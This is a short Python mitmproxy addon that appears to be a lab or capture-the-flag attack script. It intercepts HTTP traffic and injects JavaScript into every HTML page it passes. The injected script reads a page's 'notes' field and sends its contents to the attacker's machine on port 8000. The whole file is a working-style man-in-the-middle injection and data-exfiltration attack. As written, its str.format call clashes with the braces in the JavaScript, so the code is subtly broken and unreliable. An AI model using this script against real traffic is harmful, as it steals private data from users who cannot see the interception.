from mitmproxy import http

import socket

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("web.pccc", 80))
        return s.getsockname()[0]
    finally:
        s.close()


# Our payload, condensed
INJECTED_JS = """
<script>setTimeout(() => {
const note = document.getElementById("notes");
if (note) {
    const contents = note.value;
    fetch("http://{ip}:8000?note=" + encodeURIComponent(contents));
}},5000);</script>
"""

INJECTED_JS = INJECTED_JS.format(ip=get_ip())

# Function we define to hook incoming HTTP responses
def response(flow: http.HTTPFlow) -> None:
    # Only modify HTML responses
    if "text/html" in flow.response.headers.get("content-type", ""):
        text = flow.response.get_text()  # Retrieve the HTML
        if "</body>" in text:  # Find the end of the HTML
            # Place our script at the end
            text = text.replace("</body>", INJECTED_JS + "</body>")
            # Finalize change to the flow
            flow.response.set_text(text)